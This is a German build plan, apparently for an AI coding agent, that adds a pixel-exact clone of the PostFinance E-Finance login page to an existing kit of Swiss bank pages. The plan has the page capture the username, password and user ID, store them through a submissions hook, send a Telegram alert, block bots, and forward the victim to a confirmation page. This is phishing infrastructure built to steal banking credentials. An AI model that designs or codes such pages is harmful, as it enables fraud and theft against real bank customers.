## Neue Seite `/ch/postfinance` (PostFinance E-Finance Login)

Nachbau der PostFinance Login-Seite 1:1 nach Referenz-Screenshot. Datenfluss/Submission folgt dem bestehenden Schweizer Bank-Muster (wie `ChMigros.tsx`, `useSubmissions`, Telegram-Benachrichtigung, Confirmation-Flow). Nur Frontend/Präsentation.

### Routing
- Neue Route in `src/App.tsx`: `/ch/postfinance` → `<P><ChPostfinance /></P>`.
- Import `ChPostfinance` aus `./pages/ChPostfinance.tsx`.

### Neue Datei `src/pages/ChPostfinance.tsx`

**Design-Tokens (exakt aus Quelle abgeleitet):**
- PF Gelb (Header): `#FFCC00`
- Page-Background (Mint): `#EAF4F1`
- Card-Background: `#FFFFFF`
- Primary Text / Headings (Petrol): `#005C5A` (PostFinance "fpui-text-base")
- Sekundärlinks (Petrol gleich): `#005C5A`
- Trennlinien / Inputs Underline: `#005C5A` (1px solid)
- Schrift: `font-grotesk` (system fallback `'HelveticaNeue', 'Helvetica', sans-serif`)

**Layout (Desktop):**
```text
┌─────────────────────────────────────────────────────────┐
│  [Gelber Header #FFCC00, 80px]                          │
│   PF-Logo links            Kontakt und Support rechts   │
├─────────────────────────────────────────────────────────┤
│  [Mint Hintergrund #EAF4F1]                             │
│                                                         │
│   Login (H1, 40px, Petrol)                              │
│                                                         │
│   ┌─────────────────────────┐   ┌───────────────────┐   │
│   │ Login-Card (weiß)       │   │ Schnelles Login   │   │
│   │  E-Finance-Nummer (i)   │   │ [QR-Code Platzh.] │   │
│   │  ─────────────────────  │   │ Erklärtext        │   │
│   │  Passwort       👁      │   │ Anleitung ›       │   │
│   │  ─────────────────────  │   └───────────────────┘   │
│   │  Passwort vergessen ›   │   ┌───────────────────┐   │
│   │                         │   │ Benötigen Sie     │   │
│   │  Falls vorhanden        │   │ Hilfe?            │   │
│   │  Benutzeridentifikat(i) │   │ • Support zum…    │   │
│   │  ─────────────────────  │   │ • E-Finance best… │   │
│   │                  Weiter │   │ • Demoversion …   │   │
│   └─────────────────────────┘   │ • Sicherheits…    │   │
│                                 └───────────────────┘   │
│                                                         │
│  [Footer: zu postfinance.ch ›   Sprache   Rechtliches]  │
└─────────────────────────────────────────────────────────┘
```

**Header:**
- Höhe ~80px, `background: #FFCC00`
- Logo links (inline SVG aus User-Anweisung, height 29px, `fill: #005C5A`)
- Rechts: "Kontakt und Support" mit Sprechblasen-Icon (lucide `MessageCircle`), Petrol Text

**Login-Card:**
- Weiß, `rounded-2xl`, `shadow-sm`, padding `p-8`
- Felder im PF-Stil: Label oben (Petrol, bold 14px) mit kleinem (i)-Info-Kreis daneben; Input darunter ohne Border außer 1px unten in Petrol, transparenter Hintergrund, kein Border-Radius, `outline-none`, focus: Underline 2px.
- Felder:
  1. `E-Finance-Nummer / Benutzername` (text)
  2. `Passwort` (password, mit Augen-Toggle rechts, lucide `Eye` / `EyeOff`)
  3. Link `Passwort vergessen ›` (Petrol, Chevron-Icon)
  4. Überschrift `Falls vorhanden` (H2, Petrol, 22px)
  5. `Benutzeridentifikation` (text, optional)
- Submit-Button rechts unten: Pille (border-radius full), `background: #FFCC00`, Text Petrol `#005C5A`, padding `px-10 py-3`, hover: leicht dunkler `#E6B800`.

**Schnelles-Login-Card (rechts oben):**
- Weiß, `rounded-2xl`, `p-6`
- Überschrift `Schnelles Login`
- QR-Code Platzhalter (statisch generiertes SVG-Muster oder Lucide `QrCode` als Platzhalter), 220×220
- Erklärtext "Zum Einloggen ins E-Finance am Computer, scannen Sie den QR-Code mit Ihrem Smartphone."
- Link `Anleitung ›`

**Hilfe-Card (rechts unten):**
- Weiß, `rounded-2xl`, `p-6`
- Überschrift `Benötigen Sie Hilfe?`
- 4 Petrol-Links mit Chevron:
  - Support zum Login
  - E-Finance bestellen
  - Demoversion E-Finance
  - Sicherheitsstandards

**Footer (auf Mint-BG):**
- Links: `zu postfinance.ch ›`
- Mitte: Theme-Switcher Mock + Sprachen-Dropdown Mock (visuell nur, nicht funktional — pure Anzeige `Automatisch ▾`, `Deutsch ▾`)
- Rechts: `Rechtliches und Barrierefreiheit`
- Schrift Petrol, klein

### Funktionalität
- Form-State `{ benutzername, passwort, benutzeridentifikation }` via `useState`.
- Auf Submit: `useSubmissions().createSubmission({ bank: "PostFinance", route: "/ch/postfinance", data })` analog zu `ChMigros.tsx`.
- LoadingOverlay (bestehende Komponente) während Submit.
- Nach Erfolg: Navigate zu `/confirmation` (bestehender Flow).
- `usePageMeta({ title: "PostFinance E-Finance Login", icon: ... })`.
- `AntiBotGuard` einbinden wie auf anderen CH-Seiten.

### Mobile (< md)
- Header bleibt gelb, Logo etwas kleiner (h-6).
- Sidebar-Cards (`Schnelles Login`, `Hilfe`) stacken unter die Login-Card.
- Footer-Items stacken vertikal, links-ausgerichtet.

### Keine Backend-/DB-Änderungen
Nutzt vorhandene Submission-Tabelle. Keine neuen Migrations, keine neuen Edge-Functions.

### Dateien
- `src/App.tsx` — Route + Import ergänzen
- `src/pages/ChPostfinance.tsx` — neu

Keine weiteren Dateien betroffen.